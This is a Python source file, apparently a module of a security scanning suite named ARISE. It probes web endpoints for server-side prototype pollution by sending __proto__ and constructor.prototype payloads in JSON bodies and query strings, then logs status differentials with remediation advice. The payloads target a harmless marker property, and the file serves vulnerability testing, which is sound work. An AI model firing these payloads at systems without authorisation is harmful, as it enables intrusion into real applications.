#!/usr/bin/env python3
"""
ARISE — Server-side prototype pollution scanner (Phase 6.4).

Sends __proto__/constructor.prototype pollution payloads (JSON body + query string)
to candidate endpoints and looks for the two classic tells:
  1. A status/behaviour change induced by a polluted property (e.g. injecting a
     bogus header/status the app now echoes), or
  2. A reflected/500 differential vs a clean baseline.

Non-destructive: payloads only pollute a harmless test property (arise_pp). GET +
small JSON POST. Output: JSONL findings.
"""

import sys as _sys, os as _os
_ROOT = _os.path.dirname(_os.path.dirname(_os.path.abspath(__file__)))
if _ROOT not in _sys.path:
    _sys.path.insert(0, _ROOT)

import argparse
import json
import os
import sys
import urllib.parse

try:
    import requests
    requests.packages.urllib3.disable_warnings()  # type: ignore
except Exception:
    requests = None

MARKER = "arise_pp_9f8a7b"
JSON_PAYLOADS = [
    {"__proto__": {MARKER: True}},
    {"constructor": {"prototype": {MARKER: True}}},
    {"__proto__": {"status": 510, MARKER: True}},
]
QUERY_PAYLOADS = [
    f"__proto__[{MARKER}]=true",
    f"constructor[prototype][{MARKER}]=true",
    f"__proto__.{MARKER}=true",
]


def _req(method, url, **kw):
    if not requests:
        return None
    try:
        return requests.request(method, url, timeout=12, verify=False,
                                allow_redirects=False, **kw)
    except Exception:
        return None


def scan_url(url):
    findings = []
    base = _req("GET", url)
    base_code = base.status_code if base is not None else None
    base_len = len(base.text) if base is not None else 0

    def flag(vector, payload, resp, why):
        findings.append({
            "module": "prototype_pollution", "severity": "high", "confidence": "reported",
            "title": "Possible server-side prototype pollution",
            "url": url, "vector": vector, "payload": str(payload)[:200],
            "evidence": f"{why} (baseline HTTP {base_code} len {base_len}; "
                        f"polluted HTTP {resp.status_code} len {len(resp.text)})",
            "remediation": "Reject __proto__/constructor/prototype keys on input; use "
                           "Object.create(null) maps; freeze Object.prototype; validate schemas.",
        })

    # JSON body vectors
    for pl in JSON_PAYLOADS:
        r = _req("POST", url, json=pl, headers={"Content-Type": "application/json"})
        if r is None:
            continue
        polluted_status = (isinstance(pl.get("__proto__"), dict)
                           and pl["__proto__"].get("status") == 510 and r.status_code == 510)
        if polluted_status:
            flag("json", pl, r, "injected __proto__.status=510 was reflected as the response status")
        elif base_code is not None and r.status_code == 500 and base_code != 500:
            flag("json", pl, r, "polluted body triggered a 500 the clean request did not")
    # Query vectors
    sep = "&" if urllib.parse.urlsplit(url).query else "?"
    for q in QUERY_PAYLOADS:
        r = _req("GET", url + sep + q)
        if r is None:
            continue
        if base_code is not None and r.status_code == 500 and base_code != 500:
            flag("query", q, r, "polluted query triggered a 500 the clean request did not")
    return findings


def _load_targets(args):
    urls = list(args.url)
    for src in (args.list,):
        if src and os.path.isfile(src):
            with open(src, errors="ignore") as f:
                urls += [l.strip() for l in f if l.strip().startswith("http")]
    if args.scan_dir:
        # Prefer API/parameterised endpoints — those parse structured bodies.
        for rel in ("08_directory_discovery/discovered_endpoints.jsonl",
                    "09_crawling/all_urls.txt"):
            p = os.path.join(args.scan_dir, rel)
            if not os.path.isfile(p):
                continue
            with open(p, errors="ignore") as f:
                for line in f:
                    line = line.strip()
                    if rel.endswith(".jsonl"):
                        try:
                            u = json.loads(line).get("url", "")
                        except Exception:
                            u = ""
                    else:
                        u = line
                    if u.startswith("http"):
                        urls.append(u)
    seen, out = set(), []
    for u in urls:
        if u not in seen:
            seen.add(u)
            out.append(u)
    return out[: args.max_targets]


def main():
    ap = argparse.ArgumentParser(description="ARISE prototype pollution scanner")
    ap.add_argument("scan_dir", nargs="?")
    ap.add_argument("--url", action="append", default=[])
    ap.add_argument("--list")
    ap.add_argument("--out")
    ap.add_argument("--max-targets", type=int, default=150)
    args = ap.parse_args()
    if not requests:
        print("prototype_pollution: requests not installed; skipping", file=sys.stderr)
        return 0
    findings = []
    for u in _load_targets(args):
        findings.extend(scan_url(u))
    out = args.out or (os.path.join(args.scan_dir, "24_advanced_attacks", "prototype_pollution_findings.jsonl")
                       if args.scan_dir else "prototype_pollution_findings.jsonl")
    os.makedirs(os.path.dirname(out) or ".", exist_ok=True)
    with open(out, "w") as f:
        for row in findings:
            f.write(json.dumps(row) + "\n")
    print(f"prototype_pollution: {len(findings)} finding(s) -> {out}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
